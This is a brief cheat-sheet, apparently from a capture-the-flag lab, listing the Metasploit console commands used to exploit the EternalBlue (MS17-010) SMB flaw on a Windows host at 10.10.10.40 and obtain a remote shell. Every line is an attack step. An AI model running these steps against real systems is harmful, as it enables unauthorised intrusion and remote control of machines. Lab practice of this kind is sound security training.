Open metasploit
```
msfconsole
```
Search for specific exploit
```
search exploit eternalblue
```
Use the found exploit
```
use exploit/windows/smb/ms17_010_psexec
```
Show the options of the exploit
```
show options
```
Set some (required) options
```
set RHOSTS 10.10.10.40
set LHOST tun0
```

Check if the system is vunerable
```
check
```
Get a shell
```
exploit
```

